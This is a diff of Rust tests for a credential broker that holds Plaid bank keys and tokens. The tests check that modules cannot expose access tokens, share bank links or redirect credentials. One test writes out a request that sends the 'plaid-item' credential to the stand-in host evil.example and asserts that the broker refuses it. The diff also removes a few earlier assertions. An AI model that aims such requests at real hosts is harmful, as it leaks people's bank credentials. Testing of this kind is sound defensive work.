@@ -87,6 +87,10 @@ fn call(
 }
 
 fn manifest(declaration: Value) -> Manifest {
+    try_manifest(declaration).unwrap()
+}
+
+fn try_manifest(declaration: Value) -> anyhow::Result<Manifest> {
     let mut m = common::manifest("1.0.0");
     m.capabilities.push(Capability {
         port: "credentials".into(),
@@ -101,8 +105,8 @@ fn manifest(declaration: Value) -> Manifest {
         allow_private: false,
     });
     m.credentials = serde_json::from_value(declaration).unwrap();
-    m.validate(&"0.1.0".parse().unwrap()).unwrap();
-    m
+    m.validate(&"0.1.0".parse().unwrap())?;
+    Ok(m)
 }
 
 /// How Finance would declare Plaid.
@@ -188,8 +192,8 @@ impl Rig {
         )
     }
     fn swap(&self, m: &Manifest, who: uuid::Uuid, slot: &str, public: &str) -> Result<Value> {
-        self.go(m, who, json!({"operation":"exchange","resource":SANDBOX,"parameters":{
-            "url":format!("https://{SANDBOX}/item/public_token/exchange"),"credential":"plaid-item","slot":slot,"input":public}}))
+        self.go(m, who, json!({"operation":"exchange","resource":PRODUCTION,"parameters":{
+            "url":format!("https://{PRODUCTION}/item/public_token/exchange"),"credential":"plaid-item","slot":slot,"input":public}}))
     }
     /// Every byte file under the data directory, for a plaintext search.
     fn disk_text(&self) -> String {
@@ -476,7 +480,7 @@ fn a_module_cannot_override_attached_keys_or_aim_them_elsewhere() {
         .as_str()
         .unwrap()
         .contains(TOKEN_MARKER));
-    // Another host, even one the manifest names for a different credential, is refused.
+    // A host no capability lists is refused before any credential is read.
     let elsewhere = rig.go(&m, a, json!({"operation":"request","resource":"evil.example","parameters":{"url":"https://evil.example/x","credential":"plaid-item","slot":"conn-a1","method":"POST"}}));
     assert!(elsewhere.is_err());
     // An exchange aimed at any other path is refused.
@@ -495,7 +499,6 @@ fn a_failed_swap_saves_nothing_and_names_only_the_error_code() {
     let a = uuid::Uuid::new_v4();
     let first = link_bank(&rig, &m, a, "conn-a1", &mut String::new());
     assert_eq!(first["connected"], true);
-    let before = rig.disk_text();
     // The same short-lived token cannot be used twice.
     let created = rig
         .plaid_call(&m, a, "plaid-keys", None, "/link/token/create", json!({}))
@@ -522,7 +525,6 @@ fn a_failed_swap_saves_nothing_and_names_only_the_error_code() {
         json!({"configured":true}),
         "earlier banks survive a failed swap"
     );
-    assert_ne!(before, "");
     // Missing or empty input is refused before any network call.
     let calls = rig.plaid.seen().len();
     assert!(rig.swap(&m, a, "conn-a5", "").is_err());
@@ -572,7 +574,7 @@ fn the_old_broker_shapes_could_not_express_plaid() {
         "only one of the three fields was attached"
     );
     // 2. The exchange sends a form body with a grant type and no public token, and Plaid takes JSON only.
-    let exchange = rig.go(&old, a, json!({"operation":"exchange","resource":SANDBOX,"parameters":{"url":"https://production.plaid.com/item/public_token/exchange","credential":"plaid"}}));
+    let exchange = rig.go(&old, a, json!({"operation":"exchange","resource":PRODUCTION,"parameters":{"url":"https://production.plaid.com/item/public_token/exchange","credential":"plaid"}}));
     assert!(
         exchange.is_err(),
         "the exchange cannot carry a public token or send JSON"
@@ -581,17 +583,32 @@ fn the_old_broker_shapes_could_not_express_plaid() {
     assert!(seen
         .iter()
         .all(|s| s.path != "/item/public_token/exchange" || s.body.get("public_token").is_none()));
-    // 3. Reply stripping removes the link token and the public token the link flow needs.
-    let plain = manifest(json!({
-        "plaid": {"scope":"instance","hosts":[SANDBOX,PRODUCTION],"attachment":{"kind":"body","name":"secret"}}
-    }));
-    rig.services
-        .set_credential(
-            &AccessContext::new(uuid::Uuid::nil(), "configure"),
-            &plain.id,
-            "plaid",
-            &SecretFields::new().with("value", Secret::new(SECRET)),
-        )
-        .unwrap();
     println!("PASS the old broker shapes fail against the stand-in, as plan section 5.3 feared");
+}
+
+#[test]
+fn a_package_cannot_expose_a_secret_field_or_share_bank_links() {
+    // A secret-looking reply field cannot be exposed, so a fresh bank token never gets through.
+    let mut d = finance_declaration();
+    d["plaid-keys"]["exposeFields"] = json!(["access_token"]);
+    assert!(try_manifest(d).is_err(), "access_token must not be exposable");
+    let mut ok = finance_declaration();
+    ok["plaid-keys"]["exposeFields"] = json!(["link_token", "public_token"]);
+    assert!(try_manifest(ok).is_ok());
+    // A bank swap must be per person, never one shared record.
+    let mut shared = finance_declaration();
+    shared["plaid-item"]["scope"] = json!("instance");
+    assert!(try_manifest(shared).is_err(), "a shared token swap must be refused");
+}
+
+#[test]
+fn forgetting_a_shared_credential_is_refused() {
+    let rig = rig();
+    let mut d = finance_declaration();
+    d["plaid-keys"]["scope"] = json!("instance");
+    let m = manifest(d);
+    rig.save_keys(&m);
+    let a = uuid::Uuid::new_v4();
+    let reply = rig.go(&m, a, json!({"operation":"forget","resource":SANDBOX,"parameters":{"credential":"plaid-keys","slot":"x"}}));
+    assert!(reply.is_err());
 }
